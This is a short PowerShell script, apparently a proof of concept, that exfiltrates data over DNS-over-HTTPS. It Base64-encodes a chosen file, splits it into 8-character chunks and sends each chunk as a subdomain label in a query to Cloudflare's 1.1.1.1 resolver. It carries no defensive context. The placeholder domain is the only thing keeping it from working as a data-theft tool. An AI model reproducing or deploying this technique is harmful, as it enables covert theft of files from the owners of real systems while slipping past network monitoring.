$originalfile = "path/to/file"

$encoded = [Convert]::ToBase64String(
  [System.Text.Encoding]::Unicode.GetBytes(
    (Get-Content  $originalfile -Raw -Encoding UTF8)
  )
)
$CharArray = $encoded -split '(.{8})' -ne ''

Function dohq{

 param (
	[Parameter(Mandatory=$True)]
	[String]$secret
)
	
		$header = @{"accept"="application/dns-json"}
		$response = (Invoke-WebRequest -Uri "https://1.1.1.1/dns-query?name=$secret.google.com" -Headers $header)
	
		if ($response.Content.GetType().name -eq "Byte[]") {
			$json = [System.Text.Encoding]::UTF8.GetString($response.Content)
		}
		Else {
			$json = $response.Content
		}
	
		$content = $json | ConvertFrom-Json
		$content.Answer
}

Foreach ($secret in $CharArray) {
    dohq $secret
}